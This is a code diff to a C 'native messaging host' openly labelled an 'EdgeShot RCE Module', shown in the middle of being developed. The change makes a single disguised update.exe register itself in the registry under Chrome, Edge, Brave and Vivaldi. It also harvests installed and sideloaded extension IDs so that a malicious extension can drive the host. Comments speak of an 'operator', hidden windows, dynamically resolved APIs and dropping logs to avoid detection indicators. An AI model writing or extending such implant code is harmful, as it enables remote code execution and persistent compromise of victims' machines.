@@ -1,10 +1,9 @@
 /*
  * Native Messaging Host — EdgeShot RCE Module
- * Compile (Windows, MinGW): pick ONE browser flag — -DCHROME / -DVIVALDI /
- *   -DBRAVE / -DCHROMIUM (omit all of them for Edge). Example:
- *     x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -DVIVALDI -o update.exe native-host.c
- *   Do NOT use -DBROWSER=<name>: that string macro is never tested by the #if
- *   chain below, so it silently compiles an Edge host on every browser.
+ * Compile (Windows, MinGW): NO browser flag. One binary registers the host
+ *   under every supported browser (Chrome, Edge, Brave, Vivaldi) at install
+ *   time, so the same binary works regardless of the target browser.
+ *     x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -o update.exe native-host.c
  *   Add -DDEBUG_LOG to re-enable the %TEMP%\update_host.log trace (off by default:
  *   the log format strings are heavy static IOCs, so the release build omits them).
  *
@@ -21,10 +20,6 @@
 #include <time.h>
 
 /* ── Config ─────────────────────────────────────────────────────── */
-/* Browser selection: define ONE of CHROME / BRAVE / VIVALDI / CHROMIUM (or the
- * long forms BROWSER_chrome / BROWSER_brave / BROWSER_vivaldi / BROWSER_chromium).
- * Omit all of them to target Edge (the #else fallback below). The registry key
- * and extensions path are chosen in the #if chain that follows. */
 
 #define HOST_NAME     "com.site.agent"
 
@@ -106,22 +101,25 @@ static void resolve_apis(void) {
     p_ShowWindow      = (fn_ShowWindow)      rp(usr, a_showwindow,      sizeof(a_showwindow));
 }
 
-#if defined(BROWSER_chrome) || defined(CHROME)
-#define REG_PATH      "Software\\Google\\Chrome\\NativeMessagingHosts\\" HOST_NAME
-#define EXT_SUBDIR    "\\Google\\Chrome\\User Data\\Default\\Extensions"
-#elif defined(BROWSER_brave) || defined(BRAVE)
-#define REG_PATH      "Software\\BraveSoftware\\Brave-Browser\\NativeMessagingHosts\\" HOST_NAME
-#define EXT_SUBDIR    "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions"
-#elif defined(BROWSER_vivaldi) || defined(VIVALDI)
-#define REG_PATH      "Software\\Vivaldi\\NativeMessagingHosts\\" HOST_NAME
-#define EXT_SUBDIR    "\\Vivaldi\\User Data\\Default\\Extensions"
-#elif defined(BROWSER_chromium) || defined(CHROMIUM)
-#define REG_PATH      "Software\\Chromium\\NativeMessagingHosts\\" HOST_NAME
-#define EXT_SUBDIR    "\\Chromium\\User Data\\Default\\Extensions"
-#else
-#define REG_PATH      "Software\\Microsoft\\Edge\\NativeMessagingHosts\\" HOST_NAME
-#define EXT_SUBDIR    "\\Microsoft\\Edge\\User Data\\Default\\Extensions"
-#endif
+/* Supported browsers. One binary registers the host under every entry at
+ * install time (no compile-time browser flag): the operator does not need to
+ * know the target browser in advance. */
+typedef struct {
+    const char *reg_key;      /* HKCU\Software\<...>\NativeMessagingHosts\<host> */
+    const char *ext_subdir;   /* <LOCALAPPDATA>\<...>\User Data\Default\Extensions */
+} BrowserTarget;
+
+static const BrowserTarget BROWSERS[] = {
+    { "Software\\Google\\Chrome\\NativeMessagingHosts\\" HOST_NAME,
+      "\\Google\\Chrome\\User Data\\Default\\Extensions" },
+    { "Software\\Microsoft\\Edge\\NativeMessagingHosts\\" HOST_NAME,
+      "\\Microsoft\\Edge\\User Data\\Default\\Extensions" },
+    { "Software\\BraveSoftware\\Brave-Browser\\NativeMessagingHosts\\" HOST_NAME,
+      "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions" },
+    { "Software\\Vivaldi\\NativeMessagingHosts\\" HOST_NAME,
+      "\\Vivaldi\\User Data\\Default\\Extensions" },
+};
+#define BROWSER_COUNT (sizeof(BROWSERS) / sizeof(BROWSERS[0]))
 
 /* ── Logging ─────────────────────────────────────────────────────────
  * Compiled out by default. Every log_write() call carries a "[INSTALL] ..."
@@ -432,6 +430,47 @@ static void scan_prefs_for_ids(const char *path, char ids[][33], int *count, int
     free(buf);
 }
 
+/* Scan one browser's profile for extension IDs — packed extensions under
+ * Default\Extensions\<id> and unpacked/sideloaded ones in Preferences /
+ * Secure Preferences — and merge them (deduped) into `ids`. */
+static void discover_browser_ids(const char *ext_subdir, char ids[][33], int *count, int max) {
+    char ext_dir[MAX_PATH];
+    GetEnvironmentVariable("LOCALAPPDATA", ext_dir, sizeof(ext_dir));
+    strcat(ext_dir, ext_subdir);
+
+    log_write("[INSTALL] scanning: %s\n", ext_dir);
+    char search[MAX_PATH];
+    snprintf(search, sizeof(search), "%s\\*", ext_dir);
+    WIN32_FIND_DATA fd;
+    HANDLE hFind = FindFirstFile(search, &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
+                fd.cFileName[0] != '.' && strlen(fd.cFileName) == 32 &&
+                *count < max && !ext_id_seen(ids, *count, fd.cFileName)) {
+                strcpy(ids[(*count)++], fd.cFileName);
+                log_write("[INSTALL] ext found: %s\n", fd.cFileName);
+            }
+        } while (FindNextFile(hFind, &fd));
+        FindClose(hFind);
+    }
+
+    /* Unpacked/sideloaded extensions (BELoader, "Load unpacked") are NOT under
+     * Default\Extensions\<id> — their settings live in the profile's Preferences
+     * / Secure Preferences, keyed by the 32-char [a-p] extension ID. Read them
+     * out so allowed_origins lists the agent's real ID. */
+    char profile_dir[MAX_PATH];
+    strcpy(profile_dir, ext_dir);
+    char *ext_marker = strstr(profile_dir, "\\Extensions");
+    if (ext_marker) *ext_marker = '\0';
+
+    char prefs_path[MAX_PATH];
+    snprintf(prefs_path, sizeof(prefs_path), "%s\\Preferences", profile_dir);
+    scan_prefs_for_ids(prefs_path, ids, count, max);
+    snprintf(prefs_path, sizeof(prefs_path), "%s\\Secure Preferences", profile_dir);
+    scan_prefs_for_ids(prefs_path, ids, count, max);
+}
+
 /* ── MODE: Install ──────────────────────────────────────────────── */
 static int install_mode(const char *install_path) {
     char dir[MAX_PATH];
@@ -454,49 +493,13 @@ static int install_mode(const char *install_path) {
         log_write("[INSTALL] CopyFile err: %lu\n", GetLastError());
     }
 
-    /* ── Discover extension IDs ─────────────────────────────── */
-    char ext_dir[MAX_PATH];
-    GetEnvironmentVariable("LOCALAPPDATA", ext_dir, sizeof(ext_dir));
-    strcat(ext_dir, EXT_SUBDIR);
-
+    /* ── Discover extension IDs across all browsers ─────────── */
     char ext_ids[64][33] = {0};
     int ext_count = 0;
-
-    log_write("[INSTALL] scanning: %s\n", ext_dir);
-    char search[MAX_PATH];
-    snprintf(search, sizeof(search), "%s\\*", ext_dir);
-    WIN32_FIND_DATA fd;
-    HANDLE hFind = FindFirstFile(search, &fd);
-    if (hFind != INVALID_HANDLE_VALUE) {
-        do {
-            if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
-                fd.cFileName[0] != '.' && strlen(fd.cFileName) == 32 &&
-                ext_count < 64) {
-                strcpy(ext_ids[ext_count++], fd.cFileName);
-                log_write("[INSTALL] ext found: %s\n", fd.cFileName);
-            }
-        } while (FindNextFile(hFind, &fd));
-        FindClose(hFind);
+    for (size_t b = 0; b < BROWSER_COUNT && ext_count < 64; b++) {
+        discover_browser_ids(BROWSERS[b].ext_subdir, ext_ids, &ext_count, 64);
     }
     log_write("[INSTALL] %d extensions found\n", ext_count);
-
-    /* Unpacked/sideloaded extensions (BELoader, "Load unpacked") are NOT under
-     * Default\Extensions\<id> — their settings live in the profile's Preferences
-     * / Secure Preferences, keyed by the 32-char [a-p] extension ID. Read them
-     * out so allowed_origins lists the agent's real ID. */
-    {
-        char profile_dir[MAX_PATH];
-        strcpy(profile_dir, ext_dir);
-        char *ext_marker = strstr(profile_dir, "\\Extensions");
-        if (ext_marker) *ext_marker = '\0';
-
-        char prefs_path[MAX_PATH];
-        snprintf(prefs_path, sizeof(prefs_path), "%s\\Preferences", profile_dir);
-        scan_prefs_for_ids(prefs_path, ext_ids, &ext_count, 64);
-        snprintf(prefs_path, sizeof(prefs_path), "%s\\Secure Preferences", profile_dir);
-        scan_prefs_for_ids(prefs_path, ext_ids, &ext_count, 64);
-    }
-    log_write("[INSTALL] %d extensions after prefs scan\n", ext_count);
 
     /* ── Write manifest.json ────────────────────────────────── */
     char manifest_path[MAX_PATH];
@@ -536,19 +539,21 @@ static int install_mode(const char *install_path) {
         log_write("[INSTALL] manifest FAILED: %s\n", manifest_path);
     }
 
-    /* ── Registry ───────────────────────────────────────────── */
-    HKEY hkey;
-    LONG rc = p_RegCreateKeyExA(HKEY_CURRENT_USER, REG_PATH, 0, NULL,
-                                REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
-                                NULL, &hkey, NULL);
-    if (rc == ERROR_SUCCESS) {
-        rc = p_RegSetValueExA(hkey, NULL, 0, REG_SZ,
-                              (const BYTE *)manifest_path,
-                              strlen(manifest_path) + 1);
-        log_write("[INSTALL] Registry: %ld\n", rc);
-        p_RegCloseKey(hkey);
-    } else {
-        log_write("[INSTALL] RegCreateKeyEx: %ld\n", rc);
+    /* ── Registry: register under every supported browser ───── */
+    for (size_t b = 0; b < BROWSER_COUNT; b++) {
+        HKEY hkey;
+        LONG rc = p_RegCreateKeyExA(HKEY_CURRENT_USER, BROWSERS[b].reg_key, 0, NULL,
+                                    REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
+                                    NULL, &hkey, NULL);
+        if (rc == ERROR_SUCCESS) {
+            rc = p_RegSetValueExA(hkey, NULL, 0, REG_SZ,
+                                  (const BYTE *)manifest_path,
+                                  strlen(manifest_path) + 1);
+            log_write("[INSTALL] Registry[%d]: %ld\n", (int)b, rc);
+            p_RegCloseKey(hkey);
+        } else {
+            log_write("[INSTALL] RegCreateKeyEx[%d]: %ld\n", (int)b, rc);
+        }
     }
 
     /* ── Verify ─────────────────────────────────────────────── */
